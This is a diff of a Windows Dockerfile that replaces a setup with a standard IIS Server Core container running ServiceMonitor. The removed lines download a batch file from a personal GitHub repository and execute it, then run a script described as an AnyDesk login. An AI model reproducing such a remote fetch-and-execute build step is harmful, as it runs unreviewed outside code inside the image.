@@ -1,23 +1,10 @@
-# Use a different official Windows base image
-FROM mcr.microsoft.com/windows:ltsc2019
+# escape=`
+FROM mcr.microsoft.com/windows/servercore:20H2
 
-# Set environment variables for powershell execution policy
-SHELL ["powershell", "-Command"]
+RUN powershell -Command `
+    Add-WindowsFeature Web-Server; `
+    Invoke-WebRequest -UseBasicParsing -Uri "https://dotnetbinaries.blob.core.windows.net/servicemonitor/2.0.1.10/ServiceMonitor.exe" -OutFile "C:\ServiceMonitor.exe"
 
-# Install necessary tools
-RUN Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hudahadoh/winrust/main/down.bat" -OutFile "Downloads.bat" ; \
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c Downloads.bat" -Wait ; \
-    Remove-Item -Force "Downloads.bat"
+EXPOSE 80
 
-# Copy local scripts to the container
-COPY show.bat C:/show.bat
-COPY time.py C:/time.py
-
-# Set the working directory
-WORKDIR C:/
-
-# Run AnyDesk login script
-RUN Start-Process -FilePath "cmd.exe" -ArgumentList "/c show.bat" -Wait
-
-# Run the time counter script
-CMD ["python", "time.py"]
+ENTRYPOINT ["C:\\ServiceMonitor.exe", "w3svc"]
